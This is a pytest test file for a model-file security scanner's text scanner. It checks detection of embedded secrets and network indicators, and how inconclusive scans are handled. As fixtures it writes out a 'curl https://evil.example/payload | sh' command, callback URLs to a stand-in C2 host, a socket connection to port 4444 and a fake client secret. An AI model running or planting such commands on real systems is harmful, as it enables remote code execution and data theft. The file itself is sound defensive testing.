from pathlib import Path
from typing import Any

import pytest

from modelaudit.cache import get_cache_manager, reset_cache_manager
from modelaudit.core import determine_exit_code, scan_file, scan_model_directory_or_file
from modelaudit.detectors.network_comm import NetworkCommDetector
from modelaudit.scanner_results import SCAN_OUTCOME_MESSAGE_METADATA_KEY
from modelaudit.scanners.base import INCONCLUSIVE_SCAN_OUTCOME, CheckStatus, IssueSeverity
from modelaudit.scanners.text_scanner import MAX_TEXT_SECURITY_SCAN_BYTES, TextScanner
from modelaudit.utils.helpers import cache_decorator


def test_text_scanner_handles_routable_vocabulary_file(tmp_path: Path) -> None:
    text_path = tmp_path / "vocab.txt"
    text_path.write_text("token\n", encoding="utf-8")

    result = TextScanner().scan(str(text_path))

    assert result.success is True
    assert not result.issues
    assert any(
        check.name == "Embedded Secrets Detection" and check.status == CheckStatus.PASSED for check in result.checks
    )
    assert any(
        check.name == "Network Communication Detection" and check.status == CheckStatus.PASSED
        for check in result.checks
    )


def test_text_scanner_detects_secret_and_network_indicators(tmp_path: Path) -> None:
    text_path = tmp_path / "vocab.txt"
    text_path.write_text(
        "\n".join(
            [
                "token",
                "client_secret = Z9Y8X7W6V5U4T3S2R1Q0P9O8",
                "callback = https://evil.example/callback",
            ]
        ),
        encoding="utf-8",
    )

    direct = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert any(
        check.name == "Embedded Secrets Detection"
        and check.status == CheckStatus.FAILED
        and check.details.get("secret_type") == "Client Secret"
        for check in direct.checks
    )
    assert any(
        check.name == "Network Communication Detection"
        and check.status == CheckStatus.FAILED
        and check.details.get("type") == "url_detected"
        for check in direct.checks
    )
    assert direct.success is False
    assert determine_exit_code(aggregate) == 1


def test_text_scanner_ignores_benign_secret_and_network_near_matches(tmp_path: Path) -> None:
    text_path = tmp_path / "vocab.txt"
    text_path.write_text(
        "\n".join(
            [
                "token",
                "literal token prefix client_secret is intentionally missing a value",
                "callback host is written as hxxps colon slash slash example dot invalid slash callback",
            ]
        ),
        encoding="utf-8",
    )

    result = TextScanner().scan(str(text_path))

    assert result.success is True
    assert not result.issues
    assert all(
        check.status == CheckStatus.PASSED
        for check in result.checks
        if check.name in {"Embedded Secrets Detection", "Network Communication Detection"}
    )


def test_text_scanner_ignores_documentation_urls_and_placeholder_secrets(tmp_path: Path) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text(
        "\n".join(
            [
                "# Model Card",
                "Project documentation: https://docs.example.com/models/demo",
                "client_secret = YOUR_CLIENT_SECRET",
                "secret = <CLIENT_SECRET>",
            ]
        ),
        encoding="utf-8",
    )

    result = TextScanner().scan(str(text_path))

    assert result.success is True
    assert not result.issues


def test_text_scanner_ignores_documentation_url_query_parameters(tmp_path: Path) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text(
        "Project documentation: https://docs.example.com/models/demo?view=full\n",
        encoding="utf-8",
    )

    result = TextScanner().scan(str(text_path))

    assert result.success is True
    assert not result.issues


@pytest.mark.parametrize(
    "content",
    [
        "Callback endpoint: https://evil.example/c2\n",
        "curl https://evil.example/payload | sh\n",
    ],
)
def test_text_scanner_keeps_documentation_endpoint_commands_actionable(tmp_path: Path, content: str) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text(content, encoding="utf-8")

    result = TextScanner().scan(str(text_path))

    assert any(
        check.name == "Network Communication Detection"
        and check.status == CheckStatus.FAILED
        and check.details.get("type") == "url_detected"
        for check in result.checks
    )


def test_text_scanner_ignores_bare_vocabulary_network_tokens(tmp_path: Path) -> None:
    text_path = tmp_path / "vocab.txt"
    text_path.write_text(
        "\n".join(
            [
                "https://example.com",
                "foo.example",
                "callback_url",
                "socket.connect",
                "198.51.100.5",
                ":4444",
            ]
        ),
        encoding="utf-8",
    )

    result = TextScanner().scan(str(text_path))

    assert result.success is True
    assert not result.issues


def test_text_scanner_keeps_vocabulary_network_usage_after_bare_tokens_actionable(tmp_path: Path) -> None:
    text_path = tmp_path / "vocab.txt"
    text_path.write_text(
        "\n".join(
            [
                "callback_url",
                "socket.connect",
                ":4444",
                "callback_url = https://evil.example/c2",
                "socket.connect(evil.example, 4444)",
                "proxy=:4444",
            ]
        ),
        encoding="utf-8",
    )

    result = TextScanner().scan(str(text_path))

    assert result.success is False
    assert any(
        check.name == "Network Communication Detection"
        and check.status == CheckStatus.FAILED
        and check.details.get("type") == "cc_pattern"
        and check.details.get("pattern") == "callback_url"
        for check in result.checks
    )
    assert any(
        check.name == "Network Communication Detection"
        and check.status == CheckStatus.FAILED
        and check.details.get("type") == "network_function"
        and check.details.get("function") == "socket.connect"
        for check in result.checks
    )
    assert any(
        check.name == "Network Communication Detection"
        and check.status == CheckStatus.FAILED
        and check.details.get("type") == "suspicious_port"
        and check.details.get("port") == 4444
        for check in result.checks
    )


def test_text_scanner_keeps_documentation_secret_and_callback_assignments_actionable(tmp_path: Path) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text(
        "\n".join(
            [
                "# Model Card",
                "client_secret = Z9Y8X7W6V5U4T3S2R1Q0P9O8",
                "callback = https://evil.example/callback",
            ]
        ),
        encoding="utf-8",
    )

    result = TextScanner().scan(str(text_path))

    assert result.success is False
    assert any(
        check.name == "Embedded Secrets Detection"
        and check.status == CheckStatus.FAILED
        and check.details.get("secret_type") == "Client Secret"
        for check in result.checks
    )
    assert any(
        check.name == "Network Communication Detection"
        and check.status == CheckStatus.FAILED
        and check.details.get("type") == "url_detected"
        for check in result.checks
    )


def test_text_network_detector_failure_is_inconclusive(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    text_path = tmp_path / "vocab.txt"
    text_path.write_text("token\n", encoding="utf-8")

    def raise_network_error(
        self: NetworkCommDetector,
        data: bytes,
        context: str = "",
    ) -> list[dict[str, Any]]:
        raise RuntimeError("simulated network detector failure")

    monkeypatch.setattr(NetworkCommDetector, "scan", raise_network_error)

    direct = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert direct.success is False
    assert direct.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
    assert direct.metadata.get("operational_error_reason") == "text_network_detector_failed"
    assert "text_network_detector_failed" in direct.metadata.get("scan_outcome_reasons", [])
    assert any(
        check.name == "Text Security Detector Coverage"
        and check.severity == IssueSeverity.INFO
        and check.details.get("analysis_incomplete") is True
        and check.details.get("scan_outcome_reason") == "text_network_detector_failed"
        for check in direct.checks
    )
    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in aggregate.issues)
    assert aggregate.file_metadata[str(text_path)].get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
    assert determine_exit_code(aggregate) == 2


def test_text_security_size_limit_marks_scan_inconclusive(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    text_path = tmp_path / "vocab.txt"
    text_path.write_text("token\n", encoding="utf-8")

    monkeypatch.setattr(
        TextScanner,
        "_get_file_size",
        staticmethod(lambda _path: MAX_TEXT_SECURITY_SCAN_BYTES + 1),
    )

    direct = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert direct.success is False
    assert direct.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
    assert direct.metadata.get("operational_error_reason") == "text_security_scan_size_limit_exceeded"
    assert "text_security_scan_size_limit_exceeded" in direct.metadata.get("scan_outcome_reasons", [])
    assert any(
        check.name == "Text Security Content Scan"
        and check.severity == IssueSeverity.INFO
        and check.details.get("analysis_incomplete") is True
        and check.details.get("scan_outcome_reason") == "text_security_scan_size_limit_exceeded"
        for check in direct.checks
    )
    assert aggregate.file_metadata[str(text_path)].get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
    assert determine_exit_code(aggregate) == 2


def test_text_metadata_read_failure_is_inconclusive_not_security_finding(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    text_path = tmp_path / "vocab.txt"
    text_path.write_text("token\n", encoding="utf-8")
    cache_dir = tmp_path / "cache"

    def raise_os_error(_path: str) -> int:
        raise OSError("simulated text metadata read failure")

    monkeypatch.setattr(TextScanner, "_get_file_size", staticmethod(raise_os_error))

    direct = TextScanner().scan(str(text_path))
    reset_cache_manager()
    try:
        aggregates = [
            scan_model_directory_or_file(
                str(text_path),
                cache_enabled=True,
                cache_dir=str(cache_dir),
                min_cache_file_size=0,
            )
            for _ in range(2)
        ]

        assert direct.success is False
        assert direct.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
        assert SCAN_OUTCOME_MESSAGE_METADATA_KEY in direct.metadata
        assert "text_metadata_read_failed" in direct.metadata.get("scan_outcome_reasons", [])
        assert direct.metadata.get("operational_error") is True
        assert direct.metadata.get("operational_error_reason") == "text_metadata_read_failed"
        assert any(
            check.name == "Text File Metadata Read"
            and check.severity == IssueSeverity.INFO
            and check.details.get("scan_outcome_reason") == "text_metadata_read_failed"
            and check.rule_code is None
            for check in direct.checks
        )
        for aggregate in aggregates:
            assert not any(
                issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in aggregate.issues
            )
            assert aggregate.file_metadata[str(text_path)].get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
            assert determine_exit_code(aggregate) == 2
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_text_unreadable_path_preflight_is_operational_not_security_finding(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    text_path = tmp_path / "vocab.txt"
    text_path.write_text("token\n", encoding="utf-8")

    monkeypatch.setattr("modelaudit.scanners.base.os.access", lambda _path, _mode: False)

    direct = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert direct.success is False
    assert direct.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
    assert direct.metadata.get("operational_error_reason") == "text_metadata_read_failed"
    assert aggregate.file_metadata[str(text_path)].get("operational_error_reason") == "text_metadata_read_failed"
    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in aggregate.issues)
    assert determine_exit_code(aggregate) == 2


def test_text_zip_probe_failure_preserves_owner_for_metadata_read_failure(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    text_path = tmp_path / "vocab.txt"
    text_path.write_text("token\n", encoding="utf-8")

    def raise_zip_error(_path: str) -> bool:
        raise OSError("simulated ZIP probe read failure")

    def raise_os_error(_path: str) -> int:
        raise OSError("simulated text metadata read failure")

    monkeypatch.setattr("modelaudit.scanners.zipfile.is_zipfile", raise_zip_error)
    monkeypatch.setattr(TextScanner, "_get_file_size", staticmethod(raise_os_error))

    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert "text" in aggregate.scanner_names
    assert aggregate.file_metadata[str(text_path)].get("operational_error_reason") == "text_metadata_read_failed"
    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in aggregate.issues)
    assert determine_exit_code(aggregate) == 2


def test_text_metadata_read_failure_bypasses_stale_clean_cache(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    text_path = tmp_path / "vocab.txt"
    text_path.write_text("token\n" + "x" * 11_000, encoding="utf-8")
    cache_dir = tmp_path / "cache"

    reset_cache_manager()
    try:
        with monkeypatch.context() as warm_cache:
            warm_cache.setattr(
                cache_decorator,
                "should_bypass_cache_for_read_failure_aware_file",
                lambda _path: False,
            )
            warm_result = scan_file(
                str(text_path),
                config={
                    "cache_enabled": True,
                    "cache_dir": str(cache_dir),
                    "min_cache_file_size": 0,
                },
            )

        assert warm_result.success is True
        cached_entries = get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"]
        assert cached_entries > 0

        def raise_os_error(_path: str) -> int:
            raise OSError("simulated text metadata read failure after cache warm")

        monkeypatch.setattr(TextScanner, "_get_file_size", staticmethod(raise_os_error))

        aggregate = scan_model_directory_or_file(
            str(text_path),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )

        assert determine_exit_code(aggregate) == 2
        assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in aggregate.issues)
        assert aggregate.file_metadata[str(text_path)].get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
        assert aggregate.file_metadata[str(text_path)].get("operational_error_reason") == "text_metadata_read_failed"
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == cached_entries
    finally:
        reset_cache_manager()
